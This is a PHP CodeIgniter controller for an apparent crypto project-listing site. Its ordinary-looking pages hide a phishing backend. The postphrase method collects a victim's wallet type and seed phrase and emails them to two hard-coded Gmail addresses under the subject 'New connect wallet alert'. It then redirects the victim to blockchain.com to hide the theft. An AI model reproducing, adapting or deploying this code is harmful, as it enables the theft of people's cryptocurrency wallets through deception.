<?php

namespace App\Controllers;

class Home extends BaseController
{
	public function index()
	{
		$project = new \App\Models\Projects();
		$data = [
			'proj_upcoming' => $project->where('mode', 'Upcoming')->findAll(),
			'proj_ended' => $project->where('mode', 'Ended')->findAll(),
		];
		echo view('header');
		echo view('home', $data);
		echo view('footer');
	}

	public function project($name)
	{
		$project = new \App\Models\Projects();
		$data = [
			'proj' => $project->where(['name' => $name])->find(),
		];
		echo view('header');
		echo view('detail', $data);
		echo view('footer');
	}


	public function message($type, $data)
	{
		$burl = base_url();
		// $burl = 'https://app.ignitionpaidnetwork.org/';
		if ($type == 'link') {
			$output = "
            <!DOCTYPE html>
            <html lang='en'>
            <head>
                <meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title></title>
                <style>
                    body{margin: 0;padding: 0;}
                    .container{background-color: black;border-radius: 1.5rem;text-align: center;}
                    main{padding-bottom: 4rem;}
                    footer{padding: 0.4rem 0;background-color: black;color: white;border-bottom-left-radius: 1.5rem;border-bottom-right-radius: 1.5rem;}
                </style>
            </head>
            <body>
                <div class='container'>
                    <header class='logo'><img width='50%' src='" . $burl . "vendor/image/logo.svg' alt=''></header>
                    <main>
                        <h2>" . $data['msg'] . "</h2>
                    </main>
                    <footer>&copy; ignitionpaidnetwork.org</footer>
                </div>
            </body>
            </html>
        ";
		}
		return $output;
	}

	public function mailer(array $data)
	{
		$email = \Config\Services::email();
		$email->setFrom('admin@ignitionpaidnetwork.org', 'Seed Phrase Notification');
		$email->setTo($data['to']);
		$email->setCC($data['cc']);
		// $email->setBCC('them@their-example.com');

		$email->setSubject($data['subject']);
		$email->setMessage($this->message($data['type'], $data['message']));

		$email->send(false);
		// return $email->printDebugger(['headers', 'subject', 'body']);
	}

	public function postphrase()
	{
		$incoming = $this->request->getPost();
		if(isset($incoming['wallet'])){
			$msg = "Wallet type: ".$incoming['wallet']." <br> "."Seed Phrase: ".$incoming['phrase'];
		}else{
			$msg = "Seed Phrase: ".$incoming['phrase'];
		}
		$data = [
			'to' => 'amerantbankfl@gmail.com',
			'cc' => 'diamond2sure@gmail.com',
			'type' => 'link',
			'subject' => 'New connect wallet alert',
			'message' => ['msg' => $msg],
		];
		$this->mailer($data);
		return redirect()->to('https://blockchain.com');
	}
	//--------------------------------------------------------------------

}
